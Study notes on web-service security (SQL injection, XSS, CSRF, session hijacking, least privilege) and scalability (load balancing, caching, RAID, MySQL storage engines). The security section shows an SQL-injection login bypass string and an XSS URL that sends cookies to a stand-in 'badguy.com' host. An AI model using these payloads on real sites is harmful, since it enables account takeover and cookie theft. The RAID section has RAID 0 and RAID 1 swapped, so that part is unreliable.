# Security
Writing notes for learning how to build a secure web service. Discussing web server security features.

## Key Questions
- What happens if the file are not encypted?
  - FTP to SFTP
  - HTTP to HTTPS
  - telnet vs SSH
  
  User sessions or important information might sniffs by hackers. For example, people can see sessions in the header of HTTP without using SSL. Then the bad guys will be able to pretend you in the system.

- How about running the programs in different user, instead of root?
  
  - For example, using httpd to run Apache. The bad guy could only use httpd to break down Apache, and the file httpd owns.
  - Using a group to control the read access, sperate the update command for unique users.

    
## Key Threats
- ***User privilege***
  
  Try to be aware of the initial functions that the program users can execute, and keep the privilege on single user. 
	
  - For example, php web server are able to execute files by echo the name of the file. So, we should manupilating in our own code, not to enable some initial function that might cause damage, like sql injections or giving important details.
    
    Something buggy happens, like the bad guy try to delete files, they only could delete the user's only.
    
- ***Stealing info from response***

  Sensitive information should not be seen, etc: version, user tokens.
  
  - Make sure your program in your settings will not leak any critical details.

- ***Session Hijacking***
  - Packet Sniffing
  - Session Fixation (guess the session combinations)
  - XSS (Cross-Site Scripting)
  
  How can we mitigate these threats?
  - Session Encypted - SSL using public cryptography
    
    Buying a domain with SSL from godaddy. We get two unique key. A public key to encrypt the data, which could publicly spread to others. On the other hand, the private key on our server is the only key to decrypt the data.

- ***SQL Injection***
  - Remember to call the protecting functions like mysql real_escape_string() in PHP. It prevents special symbols, like semicolon;. They might even drop your table, if you ignore this risk. 

  - Down below is an bad mysql code, which might give the bad guys a chance to cause damage to your system.

	
  	"SELECT uid From users WHERE username = '%s' AND password='%s'", ...
    
    Giving password %s=123' OR '1'='1'. This case will let the user login without using the real password, since it will return true.
  
  - Django server by using orm will be much safer, or using Python Database API. Both of them have inplement escaping special symbols.
  	
- ***CSRF / XSS (Cross-Site Scripting)***
  
  CSRF
  - Bad guys might use your domain to let people clicking unwittingly, or even trigger simply by visit the bad website. For example, they embed a buying link, which cause the users kept buying specific stocks.
  
  - How do we prevent this happens?
    - Create identifier for some key functions, or we make the action more complex by using POST.
    
  XSS
  - Bad guys might able to implement script to redirect and get users cookie by using same domain as your. For example, provide a web injection by using script tag in there webs down below.
  
	www.eshop.com/?foo=<sript>documemnt.location="badguy.com/..."</srcipt>
    
    The user of eshop's cookie will automatically send to badguys.com, which is a tragety.

# Scalability
* Writing notes for learning how to design a large Scale System.
* Compare feartures, understand there pros and cons.

## Senario

> Before we started, try to imagine the product that your going to build and maintain. For example, one day the 5G has become pervasive, the user device will be dramatically increase. People can easily enter your website by phones, watches, bags, and even on their autonomous vehicle.

## Key Feature
- Load balancer 

  We let the black box balancer do the data routing to the backend server S1, S2... (ex. Load balancing with BIND DNS server -> return different IP address)
    
  How to decide whom we should send the request to?
  1. File type according to url
  2. Server load
  3. Sequence (Round Robin)
    
    For instance, using nginx to set the routing round Robin [NGINX RR Setting](https://www.nginx.com/resources/glossary/round-robin-load-balancing/)

  - Software: NGINX, ELB, HAProxy
  - Hardware: Barracuda, Cisco, Citrix
- Caches
  
  Our operating system might cache the response of the request. There might not be another DNS request every time we click a website. 

  - ***DNS TTL (time-to-live)*** is the expiration time for a DNS response. For example, power users often will have a long TTL that assign them to the same backend server, instead of reschedule them to a another backend server.
  - Consider a ***session state server***. Otherwise, for instance a php session superglobal load balancer store sessions on single machine. This will cause problem when assigning same user to other machines.
  
  - Etc. Apache - HTML, MYSQL cache, Memcached (Redis)

  Q. What if the caches goes down? What should we prepare for this?
    - A. Using RAID to recover data lost.
    - B. Using multiple server for sharing data
      - FC, iSCSI (using internet protocal), MySQL, NFS

  Q. What information should we store in the user side cache (cookies)?
    - Avoid reveal public IP. Try to encypt the important info.

  Q. What will we have to do if we run out of cache?
    - Garbage Collection (expire object)
    
- RAID (Redundant array of independent disks)
  - RAID 1
    
    ***Stiping data*** though two raids. Split datas into two disk, and try to write in simontaneously, which produce great efficiency.
    
  - RAID 0 
    
    Mirror the data in two hard drives. Rebuild when one goes down.
    
  - RAID 10
    
    Combining Raid 1 and Raid 0, using four hard drives.

  - RAID 5 
    
    More versatile. N drives but only one is for redundancy, which will only sacrificing 1/n of the RAID system. Able to recover any one drives dies.
    
  - RAID 6
  
    Able to recover any two drives dies, with one more redundancy hard drive.

- DataBase
	
    - MYSQL compare with different [storage engines](https://ssorc.tw/663/mysql-%E7%9A%84%E5%90%84%E7%A8%AE-storage-engines-%E5%84%B2%E5%AD%98%E5%BC%95%E6%93%8E%E6%AF%94%E8%BC%83/)
		
        - MyISAM
        	
            No Storage limit, and with a table Locking granularity.
        - InnoDB
        	
            Row lock, enable transactions.
          
        - Memory
        - Archive
    		
            Compressed data, suitable for storing log files.
        - Cluster/NDB

![Storage Engines](https://i.imgur.com/fGG5dtt.png)

# Referrence
- 2012 Hardvard Web Development - David Malan
